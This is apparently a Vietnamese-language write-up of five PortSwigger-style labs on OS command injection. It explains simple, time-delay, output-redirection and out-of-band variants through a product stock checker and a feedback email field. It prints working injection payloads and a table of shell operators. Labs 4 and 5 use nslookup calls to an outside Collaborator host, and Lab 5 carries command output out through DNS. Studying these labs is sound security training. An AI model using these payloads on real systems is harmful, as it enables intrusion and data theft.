# Lab 1: OS command injection, simple case

>  This lab contains an OS command injection vulnerability in the product stock checker.
> The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

> To solve the lab, execute the whoami command to determine the name of the current user. 

> OS command injection là lỗ hổng giúp ta thực thi được câu lệnh bên trong web nguy hiểm nó có thể tương tác với kernel của hệ điều hành

![image](https://github.com/j10nelop/Pr1vate/assets/152776722/eb45c925-299f-4b69-831b-8b86bb92acdd)


+ step 1 : Recon

  - với bài này này sau khi check ta thấy có chức năng "check stock" có sử dụng có 1 list mà nghĩ có thể đó là định dạng json nên ta sẽ check

![image](https://github.com/j10nelop/Pr1vate/assets/152776722/27457b86-1b12-4ea8-8ab0-9ea84855225a)

  - sử dụng brupsuite để phân tích chức năng đó

![image](https://github.com/j10nelop/Pr1vate/assets/152776722/aef4e0a1-6e2e-45bf-83f2-f3f17b485b39)

=> nó đang có 2 parameter ở body vì là lỗ hổng OS command injection nên ta sẽ khai thác thông tin này bằng cách check quote ;ls vào productid và storeid 

+ step 2: Exploit

  - payload:

    ```
      storeid=?;whoami or |whoami 
    ```

![image](https://github.com/j10nelop/Pr1vate/assets/152776722/71de2e61-b215-4d38-b150-d9957d29a136)

+ trong product id tượng trưng cho primary key không đổi của database server nên không chèn được còn store id là value thì chèn được

+ tổng hợp các operator được dùng trong OS command injection

  ```
    &: Chạy lệnh trong nền.
    &&: Chạy lệnh thứ hai nếu lệnh thứ nhất thành công.
    |: Chuyển đầu ra của lệnh bên trái thành đầu vào của lệnh bên phải.
    ||: Chạy lệnh thứ hai nếu lệnh thứ nhất thất bại.
    ;: Chạy các lệnh tuần tự, không quan tâm thành công hay thất bại.

  ```

=> solve lab 1 

# Lab 2: Blind OS command injection with time delays

>  This lab contains a blind OS command injection vulnerability in the feedback function.

> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

![image](https://github.com/user-attachments/assets/69e7540e-9f07-47ba-8303-46bfc0039b0d)

+ step 1 : Recon

  - trang web có chức năng submit feedback và trong đó trường email đang xuất hiện lỗ hổng khi test ; => could not save
 
  - để gây ra delay cho command ta sẽ sử dụng : sleep hoặc là ping -c
 
+ step 2 : Exploit

  - payload:

  ```
  email=x & sleep 10 #

  or 

  email=x & ping -c 10 127.0.0.1 # 
  ```

- & là sử dụng trong khi thỏa mãn cả 2 trường hợp

- # comment chức năng đằng sau

![image](https://github.com/user-attachments/assets/e93f306b-edc9-4536-bc12-c8fcb2d446e2)

=> solve lab 2

# Lab 3: Blind OS command injection with output redirection

>  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/

> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

> To solve the lab, execute the whoami command and retrieve the output. 

![image](https://github.com/user-attachments/assets/2a8986de-1bdc-4b2c-850c-0f706948a2fa)


+ step 1: Recon

  - trong bài này ta sẽ test chức năng chứa thông tin của lỗ hổng và nó đang nằm ở trường email => test sleep để check phản hồi
 
  - ta còn nhận được thông tin về filename image ta có thể chạy output thông qua vị trí /var/www/images
 
+ step 2 : Exploit

  - xây dụng payload trên  trường email => ghi câu lệnh vào folder root images
 
    payload:

        email = x & ls > /var/www/images/output.txt #

        or

        email = x || ping 127.0.0.1 > /var/www/images/output.txt ||

![image](https://github.com/user-attachments/assets/6d508a4b-1387-4ffd-9252-5ff92993f140)

=> sau khi ghi command lưu vào root directory thì ta sẽ chạy filename=<file> để hiển thị output


=> solve lab 3

# Lab 4: Blind OS command injection with out-of-band interaction

>  This lab contains a blind OS command injection vulnerability in the feedback function.

> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

![image](https://github.com/user-attachments/assets/e63205d0-2490-4f34-b8cb-d13c2ee727f6)


+ step 1: Recon

  - lỗ hổng vẫn là trong trường email => trong trường hợp này ta không thể sử dụng command để execute cho email được
 
  - ta cần check thử trường dns xem có bị leak từ các gói tin không
 
+ step 2: Exploit

  - payload:
 
    + sử dụng brup collaborator domain để fetch dns http header về
   
    ```
        & nslookup me4bngatc9k527z04pnqpdq51w7nvej3.oastify.com #
    ```

![image](https://github.com/user-attachments/assets/80f57973-c6d6-4866-afdd-c4f0cb80e439)


=> ta có thể thấy nó poll được DNS với giá trị IP 

=> solve Lab 4

# Lab 5: Blind OS command injection with out-of-band data exfiltration

>  This lab contains a blind OS command injection vulnerability in the feedback function.

> The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

> To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

![image](https://github.com/user-attachments/assets/d5d77424-0e38-49bc-b616-c6430a9faeb4)


+ step 1: Recon

  - trong bài này ta sẽ confirm email bị lỗ hổng bằng cách dùng
 
    & nslookup <brupcolab.domain> #


=> sau khi confirm ta sẽ test thêm command cho dns brup collab bằng whoami 

+ step 2 : Exploit

  - payload:

   ```

   & nslookup `whoami`.2uxr3wq9sp0linfgk5365t6lhcn3bvzk.oastify.com #

    or

   & nslookup $(whoami).2uxr3wq9sp0linfgk5365t6lhcn3bvzk.oastify.com #
   ```

=> ta sẽ truyền vào command vào domain brup để khi trả về dns đồng thời sẽ trả về output của câu lệnh 

![image](https://github.com/user-attachments/assets/733a7f70-59e1-42b2-8c76-372355f481ec)

=> solve lab 5
